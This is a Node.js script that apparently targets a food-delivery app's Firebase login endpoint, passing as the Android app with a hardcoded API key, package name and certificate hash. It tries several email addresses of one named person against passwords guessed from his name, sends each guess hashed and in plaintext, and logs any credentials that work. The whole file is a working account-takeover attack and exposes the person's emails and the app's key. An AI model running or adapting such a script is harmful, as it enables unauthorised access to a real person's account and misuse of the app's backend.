const crypto = require('crypto');

const API_KEY = 'AIzaSyCj35HL7MOIQMc1sXV1AGcRGt7DSkRabXk';
const PACKAGE = 'com.lyo.fooddelivery';
const SHA1 = '1B59478F8C41118B7018DD48804265B639F12DE3';

function hashPassword(pass) {
  return crypto.createHash('sha256').update(pass).digest('hex');
}

async function tryLogin(email, password, isAlreadyHashed = false) {
  const url = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${API_KEY}`;
  const sendPass = isAlreadyHashed ? password : hashPassword(password);
  
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Android-Package': PACKAGE,
        'X-Android-Cert': SHA1
      },
      body: JSON.stringify({ email, password: sendPass, returnSecureToken: true })
    });
    const data = await res.json();
    if (res.ok) {
      console.log(`✅ SUCCESS: ${email} / password: "${password}" (hashed: ${isAlreadyHashed}) -> UID: ${data.localId}`);
      return true;
    } else {
      console.log(`❌ FAILED: ${email} / password: "${password}" (hashed: ${isAlreadyHashed}) -> ${data.error ? data.error.message : JSON.stringify(data)}`);
    }
  } catch (err) {
    console.error(`Error:`, err.message);
  }
  
  // Also try plaintext
  if (!isAlreadyHashed) {
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Android-Package': PACKAGE,
          'X-Android-Cert': SHA1
        },
        body: JSON.stringify({ email, password, returnSecureToken: true })
      });
      const data = await res.json();
      if (res.ok) {
        console.log(`✅ SUCCESS (PLAINTEXT): ${email} / password: "${password}" -> UID: ${data.localId}`);
        return true;
      } else {
        console.log(`❌ FAILED (PLAINTEXT): ${email} / password: "${password}" -> ${data.error ? data.error.message : JSON.stringify(data)}`);
      }
    } catch (err) {
      console.error(`Error:`, err.message);
    }
  }
  return false;
}

async function run() {
  const emails = [
    'anantharajeinstein@gmail.com',
    'AnantharajEinstein@gmail.com',
    'anantharajmech@lyofoods.in'
  ];
  
  const passwords = [
    'AnanthEinstein',
    'Anantharajeinstein',
    'AnantharajEinstein',
    'anantharajeinstein'
  ];

  for (const email of emails) {
    for (const pass of passwords) {
      await tryLogin(email, pass, false);
    }
  }
}

run();
